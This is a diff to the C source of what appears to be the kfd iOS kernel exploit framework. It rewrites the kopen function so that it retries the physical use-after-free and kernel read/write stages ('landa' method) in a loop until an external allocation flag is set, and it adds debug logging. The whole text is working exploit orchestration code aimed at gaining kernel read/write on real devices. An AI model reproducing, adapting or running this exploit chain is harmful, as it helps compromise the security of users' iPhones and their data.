@@ -34,27 +34,39 @@ void kfd_free(struct kfd* kfd)
     bzero_free(kfd, sizeof(struct kfd));
 }
 
+extern int allocated;
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
 {
-    timer_start();
-
-    const u64 puaf_pages_min = 16;
-    const u64 puaf_pages_max = 2048;
-    assert(puaf_pages >= puaf_pages_min);
-    assert(puaf_pages <= puaf_pages_max);
-    assert(puaf_method <= puaf_smith);
-    assert(kread_method <= kread_IOSurface);
-    assert(kwrite_method <= kwrite_IOSurface);
-
-    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
-    puaf_run(kfd);
-    krkw_run(kfd);
-    info_run(kfd);
-    perf_run(kfd);
-    puaf_cleanup(kfd);
-
-    timer_end();
-    return (u64)(kfd);
+    while (!allocated) {
+        
+        timer_start();
+        
+        const u64 puaf_pages_min = 16;
+        const u64 puaf_pages_max = 2048;
+        assert(puaf_pages >= puaf_pages_min);
+        assert(puaf_pages <= puaf_pages_max);
+        assert(puaf_method <= puaf_landa);
+        assert(kread_method <= kread_IOSurface);
+        assert(kwrite_method <= kwrite_IOSurface);
+        
+        struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
+        puaf_run(kfd);
+        LOG(@"[DEBUG] landa finish puaf");
+        krkw_run(kfd);
+        LOG(@"[DEBUG] landa finish krkw");
+        if (!allocated) {
+            LOG(@"[*] try...");
+            sleep(1);
+            continue;
+        }
+        info_run(kfd);
+        perf_run(kfd);
+        puaf_cleanup(kfd);
+        
+        timer_end();
+        return (u64)(kfd);
+    }
+    return 0;
 }
 
 void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
